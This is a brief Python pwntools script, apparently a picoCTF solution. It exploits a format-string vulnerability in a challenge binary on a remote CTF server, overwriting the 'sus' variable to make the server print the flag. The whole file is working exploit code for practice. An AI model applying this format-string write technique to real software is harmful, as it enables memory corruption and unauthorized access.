from pwn import *



elf =context.binary =ELF('./vuln')


#p =process()
p =remote('rhea.picoctf.net', 61060)

payload = fmtstr_payload(14,{elf.sym['sus']:0x67616c66})


p.sendline(payload)

p.recvline()
print('Flag :',str(p.recvall()).split('...')[-1][2:-1])



